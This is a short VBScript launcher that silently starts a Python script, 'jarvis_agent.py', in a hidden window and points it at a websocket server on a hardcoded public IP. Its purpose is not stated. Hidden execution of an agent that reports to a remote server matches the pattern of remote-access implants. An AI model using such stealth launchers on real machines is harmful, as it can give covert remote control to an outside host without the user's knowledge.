Set WShell = CreateObject("WScript.Shell")
WShell.Run "pythonw " & WScript.ScriptFullName & "\..\jarvis_agent.py --server ws://161.35.11.9:4001", 0, False
